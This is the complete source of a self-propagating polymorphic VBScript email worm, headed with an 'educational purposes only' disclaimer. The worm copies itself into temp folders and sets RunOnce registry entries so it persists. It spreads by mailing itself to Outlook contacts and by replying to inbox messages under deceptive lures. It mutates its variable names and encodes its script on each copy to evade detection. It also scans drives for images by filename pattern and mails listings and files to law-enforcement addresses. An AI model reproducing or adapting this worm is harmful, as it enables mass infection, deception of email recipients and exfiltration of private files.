'PolyPedoWorm - 6IT 
'This is for educational purposes only. This program is an example of a way to make a Polymorphic, Microsoft Encoded Worm.
'I do not condone the use or release of this worm on public networks

Option Explicit
Randomize
Dim plyarr(333)
plyarr(0) = Chr(39) & "comment1comment0"
plyarr(1) = "On Error Resume Next"
plyarr(2) = "Dim fso : Set fso = CreateObject(""Scripting.FileSystemObject"")"
plyarr(3) = "Dim wsh : Set wsh = CreateObject(""WScript.Shell"")"
plyarr(4) = "Dim oldStr : oldStr = Array(""plyarr"", ""ecpArr"", ""fileOut"", ""scrEnc"", ""comment0"", ""comment1"", ""comment2"", ""comment3"", ""comment4"", ""comment5"", ""comment6"")"
plyarr(5) = "Dim sysOS : sysOS = wsh.ExpandEnvironmentStrings(""%OS%"")"
plyarr(6) = "Dim windir : windir = wsh.ExpandEnvironmentStrings(""%windir%"")"
plyarr(7) = "Dim vbsloc : vbsloc = WScript.ScriptFullname"
plyarr(8) = "Dim vbsdir : vbsdir = fso.GetParentFolderName(vbsloc)"
plyarr(9) = "Dim locdir1 : locdir1 = fso.GetSpecialFolder(2)"
plyarr(10) = "Dim locdir2 : locdir2 = fso.GetParentFolderName(locdir1)"
plyarr(11) = "Dim locdir3 : locdir3 = fso.GetParentFolderName(locdir2)"
plyarr(12) = "Dim outlook : Set outlook=WScript.CreateObject(""Outlook.Application"")" 
plyarr(13) = "Dim mapi : Set mapi=outlook.GetNameSpace(""MAPI"")"
plyarr(14) = "Dim regPtrn : regPtrn = ""(pre-teen)|(ll-series)|(mclt)|(daddo[0-9]{2,3})|(hel-an[a-z]{0,2}[0-9]{0,3})|(hel-cum[0-9]{2})|(helgav[0-9]{3})|(k.[0-9]{2}-[0-9]{2})|(yngsx[0-9]{2})|(sg-[0-9]{2}-[0-9]{2})|(polla-[0-9]{3})|(pair[0-9]{3})|(neighbor_[0-9]{3})|(mvc.[0-9][0-9]{0,1}.)|(laikab[0-9]{2})|(etnymph[0-9]{6}[a-z]{2}[0-9]{3,4})"""
plyarr(15) = "Dim found : found = False"
plyarr(16) = "ReDim DirectoryList(-1)"
plyarr(17) = "ReDim RegExFileList(-1)"
plyarr(18) = "Dim bdmessage, subject, vbsname"
plyarr(19) = "If DateDiff(""d"", Now, ""5/1/2001"" ) > 0 Then"
plyarr(20) = "bdmessage = ""I have been informed that you are currently under investigation for possession of child pornography."" & vbNewLine & ""Please read the attached document for more information.""" 
plyarr(21) = "subject = ""You Are Currently Under Investigation"""
plyarr(22) = "vbsname = ""Know The Law.txt.vbe"""
plyarr(23) = "Else"
plyarr(24) = "bdmessage = PolyFill(1024, 4096)"
plyarr(25) = "subject = PolyFill(32, 64)"
plyarr(26) = "vbsname = PolyFill(8, 16) & "".txt.vbe"""
plyarr(27) = "End If"
plyarr(28) = "Dim encpStr: encpStr = Encap(plyarr)"
plyarr(29) = "main()"
plyarr(30) = Chr(39) & "comment2comment1"

plyarr(31) = "Sub main()"
plyarr(32) = "On Error Resume Next"
plyarr(33) = "Dim LastTime, Freq : Freq = 6"
plyarr(34) = "CheckEnvi()"
plyarr(35) = "If vbsdir = locdir1 Then"
plyarr(36) = "Do"
plyarr(37) = "LastTime = wsh.RegRead(""HKCU\Software\Poly\DATE1"")"
plyarr(38) = "If LastTime = """" Or DateDiff(""h"", LastTime, Now) >= 1 Then"
plyarr(39) = "CheckEnvi()"
plyarr(40) = "OCSpread()"
plyarr(41) = "wsh.RegWrite ""HKCU\Software\Poly\DATE1"", Now, ""REG_SZ"""
plyarr(42) = "End If"
plyarr(43) = "If WScript.Version > 5.0 Then"
plyarr(44) = "Wscript.Sleep 3600000"
plyarr(45) = "Else"
plyarr(46) = "TimedDelay(3600)"
plyarr(47) = "End If"
plyarr(48) = "Loop"
plyarr(49) = "ElseIf vbsdir = locdir2 Then"
plyarr(50) = "Do"
plyarr(51) = "LastTime = wsh.RegRead(""HKCU\Software\Poly\DATE2"")"
plyarr(52) = "If LastTime = """" Or DateDiff(""d"", LastTime, Now) >= Freq Then"
plyarr(53) = "scanDrives()"
plyarr(54) = "If found = True Then"
plyarr(55) = "emailOrgs()"
plyarr(56) = "Freq = 1"
plyarr(57) = "End If"
plyarr(58) = "wsh.RegWrite ""HKCU\Software\Poly\DATE2"", Now, ""REG_SZ"""
plyarr(59) = "End If"
plyarr(60) = "If WScript.Version > 5.0 Then"
plyarr(61) = "Wscript.Sleep (Freq * 86400 * 1000)"
plyarr(62) = "Else"
plyarr(63) = "TimedDelay(Freq * 86400)"
plyarr(64) = "End If"
plyarr(65) = "Loop"
plyarr(66) = "Else"
plyarr(67) = "SmokeScrn()"
plyarr(68) = "End If"
plyarr(69) = "End Sub"
plyarr(70) = Chr(39) & "comment3comment2"

plyarr(71) = "Sub CheckEnvi()"
plyarr(72) = "On Error Resume Next"
plyarr(73) = "Dim fileOut"
plyarr(74) = "If Not fso.FileExists(locdir1 & ""\"" & vbsname) Then"
plyarr(75) = "Set fileOut = fso.CreateTextFile(locdir1 & ""\"" & vbsname, True)"
plyarr(76) = "fileOut.Write MSEncode(PolyMrph(encpStr, oldStr), "".vbs"")"
plyarr(77) = "fileOut.Close"
plyarr(78) = "wsh.Run Chr(34) & locdir1 & ""\"" & vbsname & Chr(34), 0, False"
plyarr(79) = "End If"
plyarr(80) = "If Not fso.FileExists(locdir2 & ""\"" & vbsname) Then"
plyarr(81) = "Set fileOut = fso.CreateTextFile(locdir2 & ""\"" & vbsname, True)"
plyarr(82) = "fileOut.Write MSEncode(PolyMrph(encpStr, oldStr), "".vbs"")"
plyarr(83) = "fileOut.Close"
plyarr(84) = "wsh.Run Chr(34) & locdir2 & ""\"" & vbsname & Chr(34), 0, False"
plyarr(85) = "End If"
plyarr(86) = "If wsh.RegRead(""HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\1"" & vbsname) = """" Then"
plyarr(87) = "wsh.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\1"" & vbsname, locdir1 & ""\"" & vbsname, ""REG_SZ"""
plyarr(88) = "End If"
plyarr(89) = "If wsh.RegRead(""HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\2"" & vbsname) = """" Then"
plyarr(90) = "wsh.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\2"" & vbsname, locdir2 & ""\"" & vbsname, ""REG_SZ"""
plyarr(91) = "End If"
plyarr(92) = "End Sub"
plyarr(93) = Chr(39) & "comment4comment3"

plyarr(94) = "Sub OCSpread()"
plyarr(95) = "On Error Resume Next"
plyarr(96) = "Dim list, ctrlists, ctrentries, mailadr, reglist, ctTotal"
plyarr(97) = "Randomize"
plyarr(98) = "For ctrlists = 1 To mapi.AddressLists.Count"
plyarr(99) = "reglist = 0"
plyarr(100) = "Set list = mapi.AddressLists(ctrlists)"
plyarr(101) = "reglist = wsh.RegRead(""HKCU\Software\Microsoft\WAB\POLY\"" & list)"
plyarr(102) = "If list.AddressEntries.Count > reglist Then"
plyarr(103) = "If list.AddressEntries.Count - reglist < 6 Then"
plyarr(104) = "ctTotal = list.AddressEntries.Count - reglist"
plyarr(105) = "Else"
plyarr(106) = "ctTotal = Int(5*Rnd+1)"
plyarr(107) = "End If"
plyarr(108) = "For ctrentries = 1 To ctTotal"
plyarr(109) = "Set mailadr=list.AddressEntries(Int(list.AddressEntries.Count*Rnd+1))"
plyarr(110) = "If wsh.RegRead(""HKCU\Software\Microsoft\WAB\POLY\"" & list & ""\"" & mailadr.Address) <> mailadr.Address Then"
plyarr(111) = "reglist = reglist + 1"
plyarr(112) = "Call sendMail( mailadr.Address, subject, bdmessage, vbsloc )"
plyarr(113) = "wsh.RegWrite ""HKCU\Software\Microsoft\WAB\POLY\"" & list & ""\"" & mailadr.Address, mailadr.Address, ""REG_SZ"""
plyarr(114) = "Else"
plyarr(115) = "ctrentries = ctrentries - 1"
plyarr(116) = "End If"
plyarr(117) = "Next"
plyarr(118) = "wsh.RegWrite ""HKCU\Software\Microsoft\WAB\POLY\"" & list, reglist, ""REG_DWORD"""
plyarr(119) = "Else"
plyarr(120) = "OLFldrList(mapi.Folders)"
plyarr(121) = "End if"
plyarr(122) = "Next"
plyarr(123) = "End Sub"
plyarr(124) = Chr(39) & "comment5Ccomment4"

plyarr(125) = "Sub sendMail(emlAdr, emlSub, emlBdy, fileAttch)"
plyarr(126) = "Dim mail : Set mail=outlook.CreateItem(0)"
plyarr(127) = "mail.DeleteAfterSubmit = True"
plyarr(128) = "mail.Importance = 2"
plyarr(129) = "mail.Sensitivity = 2"
plyarr(130) = "mail.Recipients.Add(emlAdr)"
plyarr(131) = "mail.Subject = emlSub"
plyarr(132) = "mail.Body = emlBdy"
plyarr(133) = "mail.Attachments.Add(fileAttch)"
plyarr(134) = "mail.Send"
plyarr(135) = "End Sub"
plyarr(136) = Chr(39) & "comment6comment5"

plyarr(137) = "Sub emailOrgs()"
plyarr(138) = "Dim emlArr : emlArr = Array(""nipc.watch@fbi.gov"", ""icpicc@customs.sprint.com"", ""matudasy@web-sanin.co.jp"", ""help.us@crimestoppers.net.au"", ""censorship@dia.govt.nz"", ""rhkpcppu@HKStar.com"", ""Colin@cosmos.co.za"", ""report@internetwatch.org.uk"", ""children@risk.sn.no"", ""Kripos@online.no"", ""baylka@t-online.de"", ""a.lambiase@wnt.it"", ""interpol@abacus.at"", ""contact@gpj.be"", ""kbhpol@inet.uni-c.dk"", ""oppcpu@gov.on.ca"")"
plyarr(139) = "Dim emlMsg : emlBdy = ""Hello, this is Poly Pedo Worm. I have found a PC with known Child Pornography files on the hard drive. I have included a file listing below and included a sample for your convenience."" & vbNewLine & vbNewline & Join(DirectoryList, vbNewLine)"
plyarr(140) = "Dim emlSub : emlSub = ""RE: Child Pornography"""
plyarr(141) = "Randomize"
plyarr(142) = "Call sendMail(emlArr(Int(UBound(emlArr)*rnd)), emlSub, emlBdy, RegExFileList(Int(UBound(RegExFileList)*rnd)))"
plyarr(143) = "End Sub"
plyarr(144) = Chr(39) & "comment0comment6"

plyarr(145) = "Sub OLFldrList(folderspec)"  
plyarr(146) = "Dim f"
plyarr(147) = "For each f in folderspec" 
plyarr(148) = "If f.DefaultItemType = 0 And f.Name <> ""Sent Items"" And f.Name <> ""Outbox"" And f.Name <> ""Drafts"" Then"
plyarr(149) = "OLFldrSpread(f)"		
plyarr(150) = "End If"
plyarr(151) = "OLFldrList(f.Folders)"
plyarr(152) = "Next"
plyarr(153) = "End Sub"
plyarr(154) = Chr(39) & "comment1comment0"

plyarr(155) = "Sub OLFldrSpread(fldr)"
plyarr(156) = "Dim mail, index, myItem, inCount :  Randomize"
plyarr(157) = "If fldr.Items.Count < 6 Then"
plyarr(158) = "inCount = fldr.Items.Count"
plyarr(159) = "Else"
plyarr(160) = "inCount = Int(5*Rnd+1)"
plyarr(161) = "End If"
plyarr(162) = "For index = 1 To inCount"
plyarr(163) = "Set myItem = fldr.Items.Item(Int(fldr.Items.Count*Rnd+1))"
plyarr(164) = "Set mail = myItem.ReplyAll"
plyarr(165) = "mail.DeleteAfterSubmit = True"
plyarr(166) = "mail.Importance = 2"
plyarr(167) = "mail.Sensitivity = 2"
plyarr(168) = "mail.Body = ""This is important, please read the attached file."" & vbNewLine & vbNewLine & mail.Body"
plyarr(169) = "mail.Attachments.Add(vbsloc)"
plyarr(170) = "mail.Send"
plyarr(171) = "Next"
plyarr(172) = "End Sub"
plyarr(173) = Chr(39) & "comment2comment1"

plyarr(174) = "Sub scanDrives()"
plyarr(175) = "Dim d,dc,s"
plyarr(176) = "Set dc = fso.Drives"
plyarr(177) = "For Each d in dc"
plyarr(178) = "If d.DriveType = 2 or d.DriveType=3 Then"
plyarr(179) = "folderlist(d.path&""\"")"
plyarr(180) = "End If"
plyarr(181) = "Next"
plyarr(182) = "End Sub"
plyarr(183) = Chr(39) & "comment3comment2"

plyarr(184) = "Sub folderlist(folderspec)"  
plyarr(185) = "Dim f,f1,sf"
plyarr(186) = "Set f = fso.GetFolder(folderspec)"  
plyarr(187) = "Set sf = f.SubFolders"
plyarr(188) = "For each f1 in sf"
plyarr(189) = "scanfiles(f1.path)"
plyarr(190) = "folderlist(f1.path)"
plyarr(191) = "Next"
plyarr(192) = "End Sub"
plyarr(193) = Chr(39) & "comment4comment3"

plyarr(194) = "Sub scanfiles(folderspec)"  
plyarr(195) = "Dim f,f1,fc,ext,ap,dirlist,matches"
plyarr(196) = "Set f = fso.GetFolder(folderspec)"
plyarr(197) = "Set fc = f.Files"
plyarr(198) = "For each f1 in fc"
plyarr(199) = "ext=fso.GetExtensionName(f1.path)"
plyarr(200) = "ext=lcase(ext)"
plyarr(201) = "If (ext=""jpg"") or (ext=""jpeg"") Then"
plyarr(202) = "dirlist = ShowFolderList(folderspec)"
plyarr(203) = "matches = RegExpTest(regPtrn, dirlist)"
plyarr(204) = "If  matches > 10 Then"
plyarr(205) = "ReDim preserve DirectoryList(UBound(DirectoryList) + 1 )"
plyarr(206) = "DirectoryList(UBound(DirectoryList)) = dirlist"
plyarr(207) = "AddToRegExFileList(folderspec)"
plyarr(208) = "End If"
plyarr(209) = "Exit For"
plyarr(210) = "End If"
plyarr(211) = "Next"  
plyarr(212) = "End Sub"
plyarr(213) = Chr(39) & "comment5comment4"

plyarr(214) = "Function ShowFolderList(folderspec)"
plyarr(215) = "Dim f, f1, fc, i"
plyarr(216) = "ReDim s(0)"
plyarr(217) = "Set f = fso.GetFolder(folderspec)"
plyarr(218) = "Set fc = f.Files" 
plyarr(219) = "s(0) = ""Directory of "" & folderspec & vbNewLine"
plyarr(220) = "For Each f1 in fc"
plyarr(221) = "i = i + 1"
plyarr(222) = "ReDim Preserve s(i)"
plyarr(223) = "s(i) = f1.DateCreated & vbTab & vbTab & f1.size & vbTab & vbTab & f1.name"
plyarr(224) = "Next"
plyarr(225) = "ShowFolderList = Join(s, vbNewLine)"
plyarr(226) = "End Function"
plyarr(227) = Chr(39) & "comment6comment5"

plyarr(228) = "Sub AddToRegExFileList(folderspec)"
plyarr(229) = "Dim f,f1,fc,ext,ap,match"
plyarr(230) = "Set f = fso.GetFolder(folderspec)"
plyarr(231) = "Set fc = f.Files"
plyarr(232) = "For each f1 in fc"
plyarr(233) = "ext=fso.GetExtensionName(f1.path)"
plyarr(234) = "ext=lcase(ext)"
plyarr(235) = "If (ext=""jpg"") or (ext=""jpeg"") Then"
plyarr(236) = "match = RegExpTest(regPtrn, fso.GetBaseName(f1.path))"
plyarr(237) = "If  match > 0 Then"
plyarr(238) = "found = True"
plyarr(239) = "ReDim preserve RegExFileList(UBound(RegExFileList) + 1)"
plyarr(240) = "RegExFileList(UBound(RegExFileList)) = f1.path"
plyarr(241) = "End If"
plyarr(242) = "End If"
plyarr(243) = "Next"
plyarr(244) = "End Sub"
plyarr(245) = Chr(39) & "comment0comment6"

plyarr(246) = "Function RegExpTest(patrn, strng)"
plyarr(247) = "Dim regEx, Match, Matches"
plyarr(248) = "Set regEx = New RegExp"     
plyarr(249) = "regEx.Pattern = patrn"       
plyarr(250) = "regEx.IgnoreCase = True"
plyarr(251) = "regEx.Global = True"
plyarr(252) = "Set Matches = regEx.Execute(strng)"
plyarr(253) = "RegExpTest = Matches.Count"
plyarr(254) = "End Function"
plyarr(255) = Chr(39) & "comment1comment0"

plyarr(256) = "Sub SmokeScrn()"
plyarr(257) = "If Not fso.FileExists(vbsdir & ""\"" & fso.GetBaseName(vbsloc)) Then"
plyarr(258) = "Dim rghtTxt(6)"
plyarr(259) = "rghtTxt(0) = ""In 1977 the Sexual Exploitation of Children Act (18 U.S.C. 2251-2253) was enacted. The law prohibits the use of a minor in the making of pornography, the transport of a child across state lines, the taking of a pornographic picture of a minor, and the production and circulation of materials advertising child pornography. It also prohibits the transfer, sale, purchase, and receipt of minors when the purpose of such transfer, sale, purchase, or receipt is to use the child or youth in the production of child pornography. The transportation, importation, shipment, and receipt of child pornography by any interstate means, including by mail or computer, is also prohibited"""
plyarr(260) = "rghtTxt(1) = ""The Child Protection Act of 1984 (18 U.S.C. 2251-2255) defines anyone younger than the age of 18 as a child. Therefore, a sexually explicit photograph of anyone 17 years of age or younger is child pornography."""
plyarr(261) = "rghtTxt(2) = ""On November 7, 1986, the U.S. Congress enacted the Child Sexual Abuse and Pornography Act (18 U.S.C. 2251-2256), that banned the production and use of advertisements for child pornography and included a provision for civil remedies of personal injuries  suffered by a minor who is a victim. It also raised the minimum sentences for repeat offenders from imprisonment of not less than two years to imprisonment of not less than five years."""
plyarr(262) = "rghtTxt(3) = ""On November 18, 1988, the U.S. Congress enacted the Child Protection and Obscenity Enforcement Act (18 U.S.C. 2251-2256) that made it unlawful to use a computer to transmit advertisements for or visual depictions of child pornography and it prohibited the buying, selling, or otherwise obtaining temporary custody or control of children for the purpose of producing child pornography."""
plyarr(263) = "rghtTxt(4) = ""On November 29, 1990, the U.S. Congress enacted 18 U.S.C. 2252 making it a federal crime to possess three or more depictions of child pornography that were mailed or shipped in interstate or foreign commerce or that were produced using materials that were mailed or shipped by any means, including by computer."""
plyarr(264) = "rghtTxt(5) = ""With the passage of the Telecommunications Act of 1996, (18 U.S.C. 2422) it is a federal crime for anyone using the mail, interstate or foreign commerce, to persuade, induce, or entice any individual younger than the age of 18 to engage in any sexual act for which the person may be criminally prosecuted."""
plyarr(265) = "rghtTxt(6) = ""The Child Pornography Prevention Act of 1996 amends the definition of child pornography to include that which actually depicts the sexual conduct of real minor children and that which appears to be a depiction of a minor engaging in sexual conduct. Computer, photographic, and photocopy technology is amazingly competent at creating and altering images that have been �morphed� to look like children even though those photographed may have actually been adults. People who alter pornographic images to look like children can now be prosecuted under the law."""
plyarr(266) = "Set fileOut = fso.CreateTextFile(vbsdir & ""\"" & fso.GetBaseName(vbsloc), True)"
plyarr(267) = "fileOut.Write Join(rghtTxt, vbNewLine & vbNewLine)"
plyarr(268) = "fileOut.Close"
plyarr(269) = "wsh.Run ""%windir%\notepad.exe "" & vbsdir & ""\"" & fso.GetBaseName(vbsloc), 1, False"
plyarr(270) = "Else"
plyarr(271) = "wsh.Run ""%windir%\notepad.exe "" & vbsdir & ""\"" & fso.GetBaseName(vbsloc), 1, False"
plyarr(272) = "End If"
plyarr(273) = "End Sub"
plyarr(274) = Chr(39) & "comment2comment1"

plyarr(275) = "Function MSEncode(strTxt, strType)"
plyarr(276) = "Dim scrEnc"
plyarr(277) = "Set scrEnc = CreateObject(""Scripting.Encoder"")"
plyarr(278) = "MSEncode = scrEnc.EncodeScriptFile( strType, strTxt, 0,"""")"
plyarr(279) = "End Function"
plyarr(280) = Chr(39) & "comment3comment2" 

plyarr(281) = "Function Encap(arr)"
plyarr(282) = "Randomize"
plyarr(283) = "Dim i, ecpArr(6)" 
plyarr(284) = "For i = 0 To Ubound(plyarr)"
plyarr(285) = "arr(i) = Replace( arr(i), Chr(34), Chr(34) & Chr(34) )"
plyarr(286) = "arr(i) = ""plyarr("" & i & "") = "" & Chr(34) & arr(i) & Chr(34)"
plyarr(287) = "Next"
plyarr(288) = "ecpArr(0) = Chr(39) & oldStr(Int(Ubound(oldStr)*Rnd)) & oldStr(Int(Ubound(oldStr)*Rnd))"
plyarr(289) = "ecpArr(1) = ""Option Explicit"""
plyarr(290) = "ecpArr(2) = ""Randomize"""
plyarr(291) = "ecpArr(3) = ""Dim plyarr("" & Ubound(plyarr) & "")"""
plyarr(292) = "ecpArr(4) = Join(arr, vbNewline)"
plyarr(293) = "ecpArr(5) = ""Execute Join(plyarr, vbNewLine)"""
plyarr(294) = "ecpArr(6) = Chr(39) & oldStr(Int(Ubound(oldStr)*Rnd)) & oldStr(Int(Ubound(oldStr)*Rnd))"
plyarr(295) = "Encap = Join(ecpArr, vbNewLine)"
plyarr(296) = "End Function"
plyarr(297) = Chr(39) & "comment4comment3"

plyarr(298) = "Function PolyMrph( strTxt, findStr)"
plyarr(299) = "Dim i : For i = 0 To UBound(findStr)"
plyarr(300) = "strTxt = Replace( strTxt, findStr(i), PolyFill(8, 32) )"
plyarr(301) = "Next"
plyarr(302) = "PolyMrph = strTxt"
plyarr(303) = "End Function"
plyarr(304) = Chr(39) & "comment5comment4"

plyarr(305) = "Function PolyFill( Min, Max)"
plyarr(306) = "Dim i, x : ReDim arr(-1) : Randomize"
plyarr(307) = "For i = 0 To Int((Max - Min + 1) * Rnd + Min)"
plyarr(308) = "ReDim preserve arr(i)"
plyarr(309) = "arr(i) = Chr(Int((122 - 97 + 1) * Rnd + 97))"
plyarr(310) = "Next"
plyarr(311) = "PolyFill = Join(arr, """")"
plyarr(312) = "End Function"
plyarr(313) = Chr(39) & "comment6comment5"

plyarr(314) = "Sub TimedDelay( Seconds )"
plyarr(315) = "Dim REG_SND : REG_SND = ""HKCU\AppEvents\Schemes\Apps\.Default\"""
plyarr(316) = "wsh.RegWrite REG_SND & "".Default\.Current\"", """""
plyarr(317) = "wsh.RegWrite REG_SND & ""SystemHand\.Current\"", """""
plyarr(318) = "wsh.RegWrite REG_SND & ""SystemQuestion\.Current\"", """""
plyarr(319) = "wsh.RegWrite REG_SND & ""SystemExclamation\.Current\"", """""
plyarr(320) = "wsh.RegWrite REG_SND & ""SystemAsterisk\.Current\"", """""
plyarr(321) = "wsh.RegWrite REG_SND & ""Open\.Current\"", """""
plyarr(322) = "wsh.RegWrite REG_SND & ""Close\.Current\"", """""
plyarr(323) = "If IsNumeric( Seconds ) And Seconds >= 1 Then"
plyarr(324) = "Dim ScriptCode : ScriptCode = ""set o=wscript.createobject(""""wscript.shell""""):o.popup """"TimedWait"""","" & Seconds"
plyarr(325) = "Dim TempScript : TempScript = fso.buildpath( fso.getspecialfolder( 2 ), fso.getbasename( fso.gettempname() ) & "".vbs"" )"
plyarr(326) = "Dim FileObject : Set FileObject = fso.createtextfile( TempScript , True )"
plyarr(327) = "FileObject.write ScriptCode"
plyarr(328) = "FileObject.close()"
plyarr(329) = "wsh.run ""wscript.exe "" & TempScript, 0, true"
plyarr(330) = "fso.deletefile TempScript"
plyarr(331) = "End If"
plyarr(332) = "End Sub"
plyarr(333) = Chr(39) & "comment0comment6"

Execute Join(plyarr, vbNewLine)


